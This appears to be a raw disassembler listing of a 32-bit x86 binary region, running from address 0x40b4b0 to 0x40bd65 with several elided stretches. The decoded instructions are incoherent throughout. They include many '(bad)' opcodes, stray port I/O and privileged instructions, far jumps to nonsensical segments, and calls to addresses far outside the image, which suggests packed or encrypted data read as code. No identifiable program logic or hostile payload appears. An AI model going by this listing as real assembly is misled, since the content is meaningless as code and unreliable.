  40b4b0:	aaa    
  40b4b1:	test   DWORD PTR [eax],ecx
  40b4b3:	(bad)  
  40b4b4:	fcom   DWORD PTR [eax+0x6cb575f5]
  40b4ba:	int    0xfd
  40b4bc:	bound  ebp,QWORD PTR [edx+0x3]
  40b4bf:	shr    al,0x60
  40b4c2:	rol    edx,0xc5
  40b4c5:	xchg   esp,eax
  40b4c6:	pusha  
  40b4c7:	xchg   ebp,eax
  40b4c9:	xlat   BYTE PTR ds:[ebx]
  40b4ca:	or     BYTE PTR [eax-0x45],ch
  40b4cd:	hlt    
  40b4ce:	inc    edi
  40b4cf:	add    BYTE PTR ds:0x62ff9aa5,bh
  40b4d5:	mov    cs,eax
  40b4d7:	jne    0x40b48b
  40b4d9:	in     al,dx
  40b4da:	lea    esp,[eax-0x1c]
  40b4dd:	xchg   esp,eax
  40b4de:	pusha  
  40b4df:	test   al,0x52
  40b4e1:	(bad)  [eax]
  40b4e3:	call   0x37bb68
  40b4e8:	outs   dx,BYTE PTR ds:[esi]
  40b4e9:	push   esp
  40b4ea:	pop    es
  40b4eb:	test   BYTE PTR [eax-0x1ffff768],ch
  40b4f1:	aam    0xf4
  40b4f3:	push   eax
  40b4f4:	(bad)  
  40b4f5:	lock add al,0xff
  40b4f8:	cmp    bh,bl
  40b4fa:	push   ebp
  40b4fb:	inc    ecx
  40b4fc:	gs adc ecx,edx
  40b4ff:	or     BYTE PTR [esi],bh
  40b501:	push   esp
  40b502:	pop    es
  40b503:	test   DWORD PTR [eax],eax
	...
  40b515:	add    BYTE PTR [eax],al
  40b517:	add    BYTE PTR [eax],dl
  40b519:	xchg   esp,eax
  40b51a:	or     BYTE PTR [eax],al
  40b51c:	iret   
  40b51d:	cwde   
  40b51e:	add    DWORD PTR [ebp+0x5d],0xffffffc9
  40b522:	(bad)  
  40b523:	(bad)  
  40b524:	mov    ebp,0x354167b8
  40b529:	imul   edi,DWORD PTR [ebp-0x4],0x60858fe2
  40b530:	fs cwde 
  40b532:	mov    esp,eax
  40b534:	or     DWORD PTR [ebp+0x18680fc8],ecx
  40b53a:	or     DWORD PTR [eax],eax
  40b53c:	mov    WORD PTR [ebp-0x3],gs
  40b53f:	je     0x40b535
  40b541:	push   cs
  40b542:	push   es
  40b543:	xchg   ebx,eax
  40b544:	ins    BYTE PTR es:[edi],dx
  40b545:	lods   al,BYTE PTR ds:[esi]
  40b546:	or     al,0x83
  40b548:	enter  0x8979,0xf7
  40b54c:	jo     0x40b5af
  40b54e:	imul   eax
  40b550:	data16 ins BYTE PTR es:[edi],dx
  40b552:	or     al,BYTE PTR [eax]
  40b554:	sbb    DWORD PTR [ecx],esi
  40b556:	out    0x4f,al
  40b558:	ss ins DWORD PTR es:[edi],dx
  40b55a:	std    
  40b55b:	je     0x40b511
  40b55d:	aad    0x18
  40b55f:	push   DWORD PTR [ebx-0x64400032]
  40b565:	icebp  
  40b566:	dec    ebx
  40b567:	add    DWORD PTR [ebp+ebp*2+0x6da07c89],ecx
  40b56e:	or     eax,0xa6c4984
  40b573:	add    BYTE PTR [esi*2+0x41080f0a],cl
  40b57a:	or     eax,DWORD PTR [eax]
	...
  40b590:	mov    WORD PTR ds:0x2b785481,ds
  40b596:	pop    eax
  40b597:	call   0xff3ca454
  40b59c:	(bad)  
  40b59d:	in     al,0x35
  40b59f:	call   0xff2695ff
  40b5a4:	fst    DWORD PTR [ebp-0x112017a6]
  40b5aa:	cld    
  40b5ab:	dec    BYTE PTR [ebx-0x48]
  40b5ae:	cld    
  40b5af:	(bad)  
  40b5b0:	cmp    ebp,DWORD PTR [ebp+0xa]
  40b5b3:	(bad)  
  40b5b4:	leave  
  40b5b5:	and    DWORD PTR [edx],ecx
  40b5b7:	add    BYTE PTR [ebp+ebp*2-0x32fcc377],cl
  40b5be:	dec    ecx
  40b5bf:	add    BYTE PTR [eax+eiz*4-0x340697a6],cl
  40b5c6:	dec    ecx
  40b5c7:	add    ah,dh
  40b5c9:	xchg   ebx,eax
  40b5ca:	imul   esi,DWORD PTR [edx-0x74],0x216c2f94
  40b5d1:	cmc    
  40b5d2:	and    BYTE PTR [ebx+esi*8],al
  40b5d5:	call   0xe3aea161
  40b5da:	fild   WORD PTR [ebx]
  40b5dc:	xchg   edi,eax
  40b5dd:	push   esp
  40b5de:	cld    
  40b5df:	sbb    esp,DWORD PTR [eax+eax*1+0x1]
  40b5e3:	inc    ebx
  40b5e4:	mov    WORD PTR [esi+eax*2+0x72],gs
  40b5e8:	mov    WORD PTR [edi+ebp*4-0x5f0adf95],ss
  40b5ef:	add    edi,DWORD PTR [ebx+0xeb47e8]
	...
  40b605:	add    BYTE PTR [eax],al
  40b607:	add    BYTE PTR [ecx-0x1d],cl
  40b60a:	fild   WORD PTR [ebx]
  40b60c:	xchg   edi,eax
  40b60d:	push   esp
  40b60e:	mov    ah,0x4b
  40b610:	xor    al,0x38
  40b612:	rol    DWORD PTR [edx-0x74],0x6c
  40b616:	bound  esi,QWORD PTR [edx-0x74]
  40b619:	xchg   esp,eax
  40b61a:	(bad)  
  40b61b:	imul   esi,DWORD PTR [eax],0xfffffff4
  40b61e:	mov    al,ds:0x17e88303
  40b623:	jmp    0x40b5ca
  40b625:	loope  0x40b606
  40b627:	add    esp,DWORD PTR [edi-0x51]
  40b62a:	bound  esi,QWORD PTR [esi]
  40b62c:	or     esi,ebp
  40b62e:	mov    al,ds:0xe9e78d03
  40b633:	imul   ebp,DWORD PTR [ecx],0xfffffff4
  40b636:	mov    al,ds:0x70be6403
  40b63b:	add    ecx,DWORD PTR [esp+eax*8-0x2c535ea9]
  40b642:	fcomip st,st(2)
  40b644:	shr    BYTE PTR [eax+ecx*8+0xb],0xbf
  40b649:	xchg   esp,eax
  40b64a:	(bad)  
  40b64c:	xchg   esi,eax
  40b64d:	adc    DWORD PTR ds:0xdfd3c393,ecx
  40b653:	add    eax,0x20892a1
  40b658:	dec    eax
  40b659:	mov    ecx,eax
  40b65b:	xor    al,0x6e
  40b65d:	cmovl  ebx,DWORD PTR [ebp-0x61f815a8]
  40b664:	jne    0x40b6c2
  40b666:	loope  0x40b644
  40b668:	std    
  40b669:	pop    esi
  40b66a:	test   BYTE PTR [esi+0x0],0x0
	...
  40b67d:	add    BYTE PTR [eax],al
  40b67f:	add    BYTE PTR [ebp+0x68],ah
  40b682:	pop    ecx
  40b683:	xchg   ecx,eax
  40b684:	scas   eax,DWORD PTR es:[edi]
  40b685:	pop    edi
  40b686:	idiv   BYTE PTR [esi+0x59]
  40b689:	fdivr  st,st(0)
  40b68b:	fs inc ebp
  40b68d:	push   0x5d920359
  40b692:	jl     0x40b6f5
  40b694:	loopne 0x40b710
  40b696:	neg    BYTE PTR [esi-0x41]
  40b699:	pop    esi
  40b69a:	jl     0x40b6f9
  40b69c:	pop    eax
  40b69d:	ins    BYTE PTR es:[edi],dx
  40b69e:	sbb    al,0x4c
  40b6a0:	lahf   
  40b6a1:	pop    esi
  40b6a2:	sub    BYTE PTR [ebx+eax*8-0x6fae8bee],0xe8
  40b6aa:	cmp    al,0x6a
  40b6ac:	sbb    eax,0xadb50970
  40b6b1:	in     al,dx
  40b6b2:	or     cl,ch
  40b6b4:	outs   dx,BYTE PTR ds:[esi]
  40b6b5:	pop    ds
  40b6b6:	not    BYTE PTR [edi+esi*2+0x7f6bc775]
  40b6bd:	pop    esi
  40b6be:	not    BYTE PTR [edi+eax*2+0x47f17c5e]
  40b6c5:	mov    eax,0x5e5efe89
  40b6ca:	jl     0x40b6c5
  40b6cc:	pop    esi
  40b6cd:	call   0x11dab7d2
  40b6d2:	mul    dh
  40b6d4:	ds call 0x8cf595be
  40b6da:	loopne 0x40b6c2
  40b6dc:	or     bl,BYTE PTR [esi-0xa]
  40b6df:	into   
  40b6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6e1:	fs loope 0x40b6e4
	...
  40b6f8:	loope  0x40b705
  40b6fa:	idiv   edi
  40b6fc:	fcmovu st,st(3)
  40b6fe:	in     al,0xe8
  40b700:	dec    ecx
  40b701:	or     al,0xf7
  40b703:	(bad)  
  40b704:	cmp    bl,ah
  40b706:	loopne 0x40b6f0
  40b708:	adc    DWORD PTR [edi+esi*8],ecx
  40b70b:	call   FWORD PTR [ecx+edx*1]
  40b70e:	hlt    
  40b70f:	call   FWORD PTR [edx]
  40b711:	bound  edi,QWORD PTR [ebp-0x4]
  40b714:	sbb    bh,BYTE PTR [ecx+eax*4+0x60]
  40b718:	mov    ah,0x98
  40b71a:	mov    esp,eax
  40b71c:	icebp  
  40b71d:	cmp    BYTE PTR [ecx-0x3e9da504],cl
  40b723:	ret    0x90e5
  40b726:	pop    ebx
  40b727:	mov    ebx,DWORD PTR [ecx-0x3a]
  40b72a:	bound  eax,QWORD PTR [eax]
  40b72c:	pop    edx
  40b72d:	fadd   QWORD PTR [eax]
  40b72f:	call   0x379732
  40b734:	cs dec ecx
  40b736:	pop    ebx
  40b737:	call   0x49985b
  40b73c:	sahf   
  40b73d:	push   eax
  40b73e:	jp     0x40b75b
  40b740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b741:	push   ebp
  40b742:	dec    esi
  40b743:	jmp    0x40b7ac
  40b745:	sbb    BYTE PTR [esi],bh
  40b747:	or     eax,0x38888d21
  40b74c:	jg     0x40b72b
  40b74e:	or     eax,esi
  40b750:	gs cwde 
  40b752:	loope  0x40b756
  40b754:	mov    cs,WORD PTR [eax+eax*2-0x1d1d49c5]
  40b75b:	mov    eax,DWORD PTR [eax]
	...
  40b76d:	add    BYTE PTR [eax],al
  40b76f:	add    BYTE PTR [esi+0x61c2bfca],ah
  40b775:	cwde   
  40b776:	pop    ebx
  40b777:	mov    ecx,DWORD PTR [ecx+0x12]
  40b77a:	retf   0x82b4
  40b77d:	gs jge 0x40b78c
  40b780:	pop    ebp
  40b781:	lds    eax,FWORD PTR [edx-0xbbd7301]
  40b787:	mov    edi,0xc95970a1
  40b78c:	dec    esi
  40b78d:	ds or  bh,bh
  40b790:	mov    eax,ds:0xe04dd269
  40b795:	and    bh,al
  40b797:	or     cl,ah
  40b799:	mov    eax,ds:0x2fd55f0d
  40b79e:	sbb    eax,0x1080fb00
  40b7a3:	(bad)  
  40b7a4:	jns    0x40b803
  40b7a6:	rcl    BYTE PTR [edi+eiz*8+0xa],cl
  40b7aa:	clc    
  40b7ab:	mov    WORD PTR [ecx-0x23],cs
  40b7ae:	pop    esp
  40b7af:	jmp    DWORD PTR [ecx+0x69]
  40b7b2:	shl    cl,cl
  40b7b4:	push   es
  40b7b5:	jecxz  0x40b7ae
  40b7b7:	or     cl,ah
  40b7b9:	cmp    cl,BYTE PTR [esi+0xa6d8f07]
  40b7bf:	inc    DWORD PTR [ecx-0x47]
  40b7c2:	div    DWORD PTR [esp+esi*4-0x2b]
  40b7c6:	mov    cl,0x8f
  40b7c8:	stos   DWORD PTR es:[edi],eax
  40b7c9:	retf   0xbff3
  40b7cc:	xchg   ebx,eax
  40b7cd:	jmp    0x6dccb9ba
  40b7d2:	jae    0x40b818
	...
  40b7e8:	mov    al,ds:0xcb7fe4f6
  40b7ed:	ins    DWORD PTR es:[edi],dx
  40b7ee:	or     DWORD PTR [edx+ebx*2-0x1cfff591],eax
  40b7f5:	test   DWORD PTR [ebp-0x1],ebx
  40b7f8:	jae    0x40b77c
  40b7fa:	jno    0x40b840
  40b7fc:	cmp    al,0x8a
  40b7fe:	jge    0x40b7d0
  40b800:	hlt    
  40b801:	cmp    DWORD PTR [ebx+0x41],ebp
  40b804:	mov    WORD PTR [ebp+0x6d8c706b],es
  40b80a:	pop    edx
  40b80b:	inc    ecx
  40b80d:	jge    0x40b863
  40b80f:	sbb    BYTE PTR [ebp+0x24042094],ch
  40b815:	ror    DWORD PTR [edi+0x4],0x8c
  40b819:	(bad)  
  40b81a:	fidiv  WORD PTR [esi+0x3c]
  40b81d:	in     al,dx
  40b81e:	jecxz  0x40b882
  40b820:	int    0x94
  40b822:	xlat   BYTE PTR ds:[ebx]
  40b823:	dec    eax
  40b824:	pushf  
  40b825:	xchg   esp,eax
  40b826:	fisttp WORD PTR [ebp-0x4b]
  40b829:	(bad)  
  40b82a:	lahf   
  40b82b:	ja     0x40b7c5
  40b82d:	(bad)  
  40b82e:	xchg   ecx,eax
  40b82f:	ja     0x40b7c5
  40b831:	(bad)  
  40b832:	mov    eax,0xe20e1100
  40b837:	add    ecx,DWORD PTR [edi+ecx*4+0x539576a8]
  40b83e:	sub    eax,0xdf948cb8
  40b843:	add    esp,edi
  40b845:	xchg   edx,eax
  40b846:	scas   al,BYTE PTR es:[edi]
  40b847:	inc    esi
  40b848:	sbb    BYTE PTR [edi+ebx*8+0x3],dl
	...
  40b85f:	add    BYTE PTR [eax+ebx*2+0x5b04c3b3],cl
  40b866:	outs   dx,DWORD PTR ds:[esi]
  40b867:	lock mov edx,0x8b2b8665
  40b86d:	loope  0x40b84e
  40b86f:	enter  0x6c50,0xe0
  40b873:	add    ecx,DWORD PTR [esp+edx*4-0x7473cfa1]
  40b87a:	imul   ecx,DWORD PTR [ebx-0x72],0xffffff94
  40b87e:	fistp  WORD PTR [eax+0x74]
  40b881:	cmp    ah,BYTE PTR [esi]
  40b883:	lock or BYTE PTR [eiz*4+0x17d80ebf],0x3
  40b88c:	stc    
  40b88d:	mov    bl,0x87
  40b88f:	hlt    
  40b890:	fcmovbe st,st(3)
  40b892:	fcomip st,st(0)
  40b894:	fmul   DWORD PTR [eax+0x18]
  40b897:	call   0xfd204d86
  40b89c:	adc    ecx,DWORD PTR [edx-0x696693f8]
  40b8a2:	or     cl,ch
  40b8a4:	push   esp
  40b8a5:	shl    eax,1
  40b8a7:	call   0xd0494d3b
  40b8ac:	xor    dl,BYTE PTR [eax+ecx*1-0x1f26f117]
  40b8b3:	call   0x44c0425c
  40b8b8:	and    al,0x53
  40b8ba:	dec    esp
  40b8bb:	ror    DWORD PTR [esi-0x1716f76c],1
  40b8c1:	push   esi
  40b8c2:	or     cl,ch
	...
  40b8d8:	(bad)  
  40b8d9:	adc    eax,0xdf8e9174
  40b8de:	add    eax,0xce747d70
  40b8e3:	sub    al,0xc8
  40b8e5:	xchg   esi,eax
  40b8e6:	or     cl,ch
  40b8e8:	(bad)  
  40b8e9:	imul   esp,DWORD PTR [edi-0x766b7018],0xfffffffc
  40b8f0:	mov    bh,0x96
  40b8f2:	jnp    0x40b8da
  40b8f4:	dec    eax
  40b8f5:	fcom   st(4)
  40b8f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8f8:	push   ebp
  40b8f9:	ins    BYTE PTR es:[edi],dx
  40b8fa:	or     eax,0xdf948fe9
  40b8ff:	or     BYTE PTR [ecx+0x1d6a0894],0x6c
  40b906:	or     eax,0x740ca2d4
  40b90b:	and    ebx,edx
  40b90d:	shl    al,1
  40b90f:	in     al,0x8f
  40b911:	xchg   esp,eax
  40b912:	or     BYTE PTR [eax+0x14],al
  40b915:	xchg   esp,eax
  40b916:	or     cl,ch
  40b918:	push   cs
  40b919:	fsub   st,st(0)
  40b91b:	in     al,dx
  40b91c:	jp     0x40b92e
  40b91e:	fs call 0x94c04db3
  40b924:	inc    ebx
  40b925:	push   ss
  40b926:	je     0x40b97d
  40b928:	mov    al,ah
  40b92a:	(bad)  
  40b92b:	jmp    FWORD PTR [edx+0x6502e0cb]
  40b931:	xchg   ebp,eax
  40b932:	or     bl,ch
  40b934:	cmp    dl,BYTE PTR [edx+0x4d]
  40b937:	call   0x494e67
	...
  40b950:	jmp    0x895:0x2500c8cb
  40b957:	(bad)  
  40b958:	js     0x40b972
  40b95a:	idiv   bh
  40b95c:	xor    eax,0xe945cd95
  40b961:	xchg   esp,eax
  40b962:	or     BYTE PTR [eax],al
  40b964:	and    eax,0xf5bc4d52
  40b969:	xchg   esp,eax
  40b96a:	or     BYTE PTR [eax],al
  40b96c:	sub    cl,ah
  40b96e:	mov    al,0x0
  40b970:	in     eax,0x94
  40b972:	or     bh,bh
  40b974:	cwde   
  40b975:	ins    BYTE PTR es:[edi],dx
  40b976:	out    dx,al
  40b977:	adc    eax,DWORD PTR [ebx]
  40b979:	push   0xfffffff7
  40b97b:	mov    DWORD PTR [eax+0x3175f750],ebp
  40b981:	cmp    eax,0x6a52fe0e
  40b986:	add    DWORD PTR [ebp-0x13],0xdd47d69
  40b98d:	fs cmc 
  40b98f:	push   DWORD PTR [edx]
  40b991:	fmul   DWORD PTR [esp+eax*8+0x26]
  40b995:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b996:	xchg   ebp,eax
  40b997:	pusha  
  40b998:	hlt    
  40b999:	xchg   esp,eax
  40b99a:	or     BYTE PTR [ebp-0x19],dh
  40b99d:	mov    esp,0x94e4619b
  40b9a2:	loopne 0x40b92b
  40b9a4:	ret    
  40b9a5:	xchg   esp,eax
  40b9a6:	or     BYTE PTR [eax+0x4d],dl
  40b9a9:	std    
  40b9aa:	push   0x7d677541
  40b9af:	rcr    BYTE PTR [ebp+0x7876],0x0
	...
  40b9c6:	add    BYTE PTR [eax],al
  40b9c8:	gs pop ebx
  40b9ca:	mov    dh,0x74
  40b9cc:	mov    WORD PTR [ebp+0x52],fs
  40b9cf:	pushf  
  40b9d0:	in     eax,dx
  40b9d1:	sub    al,0xa
  40b9d3:	call   0x4ab9bf
  40b9d8:	mov    esp,0xcd608605
  40b9dd:	ins    DWORD PTR es:[edi],dx
  40b9de:	out    0x74,eax
  40b9e0:	dec    esp
  40b9e1:	xchg   esi,eax
  40b9e2:	sbb    dh,BYTE PTR [eax-0x74]
  40b9e5:	ins    DWORD PTR es:[edi],dx
  40b9e6:	icebp  
  40b9e7:	mov    edi,0xa45476b8
  40b9ec:	lods   eax,DWORD PTR ds:[esi]
  40b9ed:	lods   al,BYTE PTR ds:[esi]
  40b9ee:	or     al,0xe8
  40b9f0:	rcl    DWORD PTR [edi-0x3a43fff4],cl
  40b9f6:	mov    al,ds:0xe56dcd60
  40b9fb:	je     0x40b9c9
  40b9fd:	push   ebp
  40b9fe:	cld    
  40b9ff:	outs   dx,BYTE PTR ds:[esi]
  40ba00:	mov    WORD PTR [ebp-0x2f],gs
  40ba03:	and    al,0xf
  40ba05:	jno    0x40b98c
  40ba07:	pop    edi
  40ba08:	dec    ebp
  40ba09:	ins    DWORD PTR es:[edi],dx
  40ba0a:	or     esi,DWORD PTR [ebp-0x7a]
  40ba0d:	xchg   ebp,eax
  40ba0e:	xchg   ebp,eax
  40ba0f:	pusha  
  40ba10:	dec    ebp
  40ba11:	ins    DWORD PTR es:[edi],dx
  40ba12:	shr    BYTE PTR [ebx],cl
  40ba14:	push   0x6d
  40ba16:	or     dl,BYTE PTR [eax+0x64]
  40ba19:	enter  0x4169,0x8c
  40ba1d:	fidivr WORD PTR [ebp-0x40]
  40ba20:	mov    ah,0x1
  40ba22:	push   esp
  40ba23:	add    BYTE PTR [edx+eax*8+0x62cc2b0a],cl
  40ba2a:	retf   0x74
	...
  40ba3d:	add    BYTE PTR [eax],al
  40ba3f:	add    BYTE PTR [esi],ch
  40ba41:	mov    esi,0x37b4c87d
  40ba46:	push   esp
  40ba47:	add    BYTE PTR [ebp+edi*8-0x3a3b8b1c],cl
  40ba4e:	out    dx,eax
  40ba4f:	stc    
  40ba50:	mov    ebx,DWORD PTR [esi-0x59bfbb8f]
  40ba56:	jge    0x40ba1c
  40ba58:	fs xchg esp,eax
  40ba5a:	sub    DWORD PTR [edi-0x74],ebx
  40ba5d:	xchg   esp,eax
  40ba5e:	scas   eax,DWORD PTR es:[edi]
  40ba5f:	in     al,dx
  40ba60:	loopne 0x40bab2
  40ba62:	or     ch,dh
  40ba64:	fs push edi
  40ba66:	pop    es
  40ba67:	jnp    0x40ba39
  40ba69:	sbb    al,0x63
  40ba6b:	outs   dx,DWORD PTR ds:[esi]
  40ba6c:	dec    esp
  40ba6d:	xchg   esp,eax
  40ba6e:	jnp    0x40baa7
  40ba70:	psubusw mm6,QWORD PTR [edi]
  40ba73:	add    al,0xb8
  40ba75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba76:	xchg   DWORD PTR [ebx],eax
  40ba78:	mov    WORD PTR [edi-0x52],fs
  40ba7b:	in     al,dx
  40ba7c:	mov    eax,0xaab3d78c
  40ba81:	push   edi
  40ba82:	fucomip st,st(4)
  40ba84:	cwde   
  40ba85:	push   esp
  40ba86:	(bad)  
  40ba87:	jbe    0x40ba0d
  40ba89:	ins    BYTE PTR es:[edi],dx
  40ba8a:	out    0x83,eax
  40ba8c:	adc    dl,BYTE PTR [edi-0x49]
  40ba8f:	jbe    0x40bad9
  40ba91:	push   edi
  40ba92:	xor    eax,0x2757ebfc
  40ba97:	in     eax,dx
  40ba98:	cli    
  40ba99:	push   esi
  40ba9a:	adc    eax,0xf7e0f2ac
  40ba9f:	fcmovnu st,st(4)
  40baa1:	(bad)  
  40baa2:	sahf   
  40baa3:	in     al,dx
	...
  40bab8:	loop   0x40ba9a
  40baba:	lahf   
  40babb:	fcmovnb st,st(1)
  40babd:	adc    DWORD PTR [edi-0x481f2d14],ecx
  40bac3:	fcmovnu st,st(1)
  40bac5:	adc    DWORD PTR [edi-0x14],edi
  40bac8:	ret    0xabe0
  40bacb:	fcmovnbe st,st(1)
  40bacd:	adc    DWORD PTR [edi-0x14],ebp
  40bad0:	mov    dl,0xe0
  40bad2:	xchg   ebx,eax
  40bad3:	fucomi st,st(1)
  40bad5:	adc    DWORD PTR [edi-0x14],ebx
  40bad8:	mov    ds:0xe1db97e0,al
  40badd:	adc    DWORD PTR [edi-0x14],ecx
  40bae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bae1:	mov    BYTE PTR [edx+0x6e],ah
  40bae4:	je     0x40ba75
  40bae6:	or     BYTE PTR [eax+ecx*4-0x72beb3b3],bh
  40baed:	xchg   esp,eax
  40baee:	or     cl,ch
  40baf0:	or     al,0xd9
  40baf2:	loopne 0x40badd
  40baf4:	jecxz  0x40ba9a
  40baf6:	pusha  
  40baf7:	sbb    ah,BYTE PTR [eax-0x1df1f72d]
  40bafd:	dec    eax
  40bafe:	loope  0x40bb11
  40bb00:	mov    dl,0x94
  40bb02:	or     dl,dh
  40bb04:	dec    edi
  40bb05:	loope  0x40bb14
  40bb07:	cs retf 0x86c
  40bb0b:	jmp    0x78a14f9f
  40bb10:	test   eax,0x9dde08d3
  40bb15:	dec    eax
  40bb16:	loope  0x40bad1
  40bb18:	lds    edx,FWORD PTR [eax+ecx*1+0xe2]
	...
  40bb2f:	add    BYTE PTR [edi-0x1f],cl
  40bb32:	or     eax,0xb6ccdae
  40bb37:	jmp    0x3d364fcb
  40bb3c:	inc    esp
  40bb3d:	outs   dx,BYTE PTR ds:[esi]
  40bb3e:	pusha  
  40bb3f:	imul   esp,edi,0x56
  40bb42:	cmc    
  40bb43:	fcmove st,st(7)
  40bb45:	sbb    al,0xf6
  40bb47:	sahf   
  40bb48:	not    DWORD PTR [esi-0x5]
  40bb4b:	inc    edi
  40bb4c:	mov    al,0x8d
  40bb4e:	add    eax,0xf6590764
  40bb53:	xchg   bh,ah
  40bb55:	loopne 0x40bb2f
  40bb57:	xchg   ecx,eax
  40bb58:	xchg   DWORD PTR [edx],edx
  40bb5a:	div    BYTE PTR [esi-0x49]
  40bb5d:	loopne 0x40bb43
  40bb5f:	or     DWORD PTR [edi+0x12],0xd03566f6
  40bb66:	clc    
  40bb67:	mov    ecx,0x5680dfc7
  40bb6c:	mov    bh,0x6d
  40bb6e:	in     eax,0x51
  40bb70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb71:	push   esi
  40bb72:	push   esi
  40bb73:	add    BYTE PTR [esi+ecx*2+0x6],bl
  40bb77:	add    BYTE PTR [eax],ah
  40bb79:	(bad)  
  40bb7a:	loope  0x40bafd
  40bb7c:	mov    cl,0x24
  40bb7e:	hlt    
  40bb7f:	jmp    FWORD PTR [edx-0x544772af]
  40bb85:	imul   esi,edi,0x8917500
  40bb8b:	mov    esi,DWORD PTR [eax]
  40bb8d:	test   DWORD PTR [ecx],eax
  40bb8f:	rol    BYTE PTR [ecx],0x94
  40bb92:	mov    BYTE PTR [eax],bh
	...
  40bba8:	gs in  al,0xb
  40bbab:	jmp    0x494aa1
  40bbb0:	cmp    ah,ah
  40bbb2:	sbb    al,0xe8
  40bbb4:	sbb    eax,0x3efff6dc
  40bbb9:	push   ecx
  40bbba:	jge    0x40bbcb
  40bbbc:	mov    ebp,0x35414768
  40bbc1:	push   0x7d
  40bbc3:	adc    al,0x4d
  40bbc5:	add    ecx,DWORD PTR [ebp+0x5364aff]
  40bbcb:	push   0x479a48
  40bbd0:	cmp    ah,ah
  40bbd2:	sbb    al,0xe8
  40bbd4:	jb     0x40bbea
  40bbd6:	idiv   edi
  40bbd8:	jl     0x40bbee
  40bbda:	mov    esi,0x6e6a0afe
  40bbdf:	ds hlt 
  40bbe1:	nop
  40bbe2:	or     BYTE PTR [ebp-0xbb090],cl
  40bbe8:	or     al,cl
  40bbea:	loopne 0x40bbeb
  40bbec:	xor    al,0x6a
  40bbee:	test   DWORD PTR [ebp-0xbb0d0],0xb5f5c12a
  40bbf8:	in     eax,dx
  40bbf9:	push   0xfffffff7
  40bbfb:	(bad)  
  40bbfc:	cmp    eax,0x8c0063a0
  40bc01:	imul   esi,DWORD PTR [ebp-0x7c],0xffffffd8
  40bc05:	(bad)  
  40bc09:	pop    esi
  40bc0a:	jbe    0x40bbf1
	...
  40bc20:	lea    edi,ds:0x80198d0a
  40bc26:	(bad)  
  40bc28:	jnp    0x40bbb5
  40bc2a:	or     edx,DWORD PTR [eax]
  40bc2c:	mov    WORD PTR ds:0xbf100f0a,?
  40bc32:	or     DWORD PTR [eax],eax
  40bc34:	mov    WORD PTR [eax+0x15bc2c4b],?
  40bc3a:	dec    DWORD PTR [esi-0x33]
  40bc3d:	cmp    eax,0x3db909d2
  40bc42:	or     cl,BYTE PTR [ebx]
  40bc44:	dec    esp
  40bc45:	ror    DWORD PTR [eax],1
  40bc47:	jmp    0x4af960
  40bc4c:	add    ecx,edx
  40bc4e:	into   
  40bc4f:	std    
  40bc50:	sub    esi,DWORD PTR [ebx+0x7e]
  40bc53:	inc    ecx
  40bc54:	jo     0x40bbe3
  40bc56:	push   esp
  40bc57:	cmc    
  40bc58:	retf   
  40bc59:	jl     0x40bc67
  40bc5b:	call   0x4da681
  40bc60:	xchg   edi,eax
  40bc61:	std    
  40bc62:	gs add eax,0x986f5
  40bc68:	mov    WORD PTR [edx],es
  40bc6a:	data16 adc al,0xe4
  40bc6d:	icebp  
  40bc6e:	jo     0x40bc6e
  40bc70:	jmp    0x40bcb8
  40bc72:	retf   0x9374
  40bc75:	xchg   ebp,eax
  40bc76:	mov    eax,0xe13d4d47
  40bc7b:	je     0x40bcf5
  40bc7d:	and    eax,0xd2cb83ff
  40bc82:	ror    DWORD PTR [ecx],cl
	...
  40bc98:	ss cmp eax,0x15a074e1
  40bc9e:	jmp    0x40bc23
  40bca0:	mov    bl,0x94
  40bca2:	outs   dx,BYTE PTR ds:[esi]
  40bca3:	ja     0x40bca5
  40bca5:	push   edi
  40bca6:	push   esi
  40bca7:	jmp    0x17f2de4e
  40bcac:	ds in  al,0x47
  40bcaf:	push   ds
  40bcb0:	or     DWORD PTR [edi+ecx*2+0x54],edx
  40bcb4:	fcom   QWORD PTR [ebx-0x43]
  40bcb7:	adc    eax,DWORD PTR [ebx+0xe8ebc9]
  40bcbd:	popf   
  40bcbe:	inc    edi
  40bcbf:	cmc    
  40bcc0:	jno    0x40bd15
  40bcc2:	das    
  40bcc3:	fsubr  QWORD PTR [ebp+0x74e91715]
  40bcc9:	and    al,0x3
  40bccc:	mov    WORD PTR [ecx],fs
  40bcce:	mov    ds:0x34190517,al
  40bcd3:	jmp    0xb423:0x2763534a
  40bcda:	mov    al,ds:0xadc98f03
  40bcdf:	pop    ebx
  40bce0:	pop    edx
  40bce1:	mov    ah,0x20
  40bce3:	add    al,0x2b
  40bce5:	or     DWORD PTR [ecx+ebp*8+0x58c85322],ebx
  40bcec:	test   eax,0xd3fcdf94
  40bcf1:	(bad)  
  40bcf2:	sbb    al,0x5c
  40bcf4:	inc    eax
  40bcf5:	fsub   QWORD PTR [eax]
  40bcf7:	add    al,0x3
  40bcf9:	leave  
  40bcfa:	rcr    ebx,cl
	...
  40bd10:	add    al,0x18
  40bd12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd13:	call   0xe994c60a
  40bd18:	jmp    0x9f17:0xbcdc3052
  40bd1f:	call   0x421796f
  40bd24:	jecxz  0x40bd37
  40bd26:	adc    cl,ch
  40bd28:	inc    eax
  40bd29:	pushf  
  40bd2a:	xchg   edi,eax
  40bd2b:	(bad)  
  40bd2c:	jmp    0xd7b6c683
  40bd31:	pop    esp
  40bd32:	mov    DWORD PTR [esi-0x5c],ebp
  40bd35:	cmp    ebx,ebp
  40bd37:	jmp    0x3ea151cb
  40bd3c:	das    
  40bd3d:	aad    0x8
  40bd3f:	push   esi
  40bd40:	jmp    0x203a:0xa44ef706
  40bd47:	aam    0x8f
  40bd49:	xchg   esp,eax
  40bd4a:	add    DWORD PTR [ecx],ebp
  40bd4c:	repz and BYTE PTR [eax+0x7d],0xb7
  40bd51:	ror    DWORD PTR [eax],cl
  40bd53:	cs loop 0x40bcfe
  40bd56:	loopne 0x40bd02
  40bd58:	jmp    0x40bdac
  40bd5a:	neg    BYTE PTR [esi]
  40bd5c:	xor    al,BYTE PTR [esi]
  40bd5e:	not    DWORD PTR [esi]
  40bd60:	fs loop 0x40bd43
  40bd63:	(bad)  
  40bd65:	push   edx
